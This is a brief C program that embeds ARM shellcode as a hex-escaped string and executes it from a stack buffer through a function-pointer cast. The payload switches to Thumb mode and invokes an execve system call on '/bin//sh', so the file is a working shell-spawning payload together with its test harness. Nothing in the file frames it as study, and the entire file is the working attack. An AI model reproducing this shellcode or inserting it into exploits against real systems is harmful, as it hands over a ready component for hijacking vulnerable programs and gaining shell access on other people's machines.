#include <stdio.h>
#include <string.h>

char *SC =      "\x01\x30\x8f\xe2"
                "\x13\xff\x2f\xe1"
                "\x78\x46\x0e\x30"
                "\x01\x90\x49\x1a"
                "\x92\x1a\x08\x27"
                "\xc2\x51\x03\x37"
                "\x01\xdf\x2f\x62"
                "\x69\x6e\x2f\x2f"
                "\x73\x68";

int main(void)
{
    char payload[34];

    memcpy(payload, SC, 34);

    fprintf(stdout, "V1.0.0 Length: %d\n", strlen(SC));
    (*(void(*)()) payload) ();

    return 0;
}
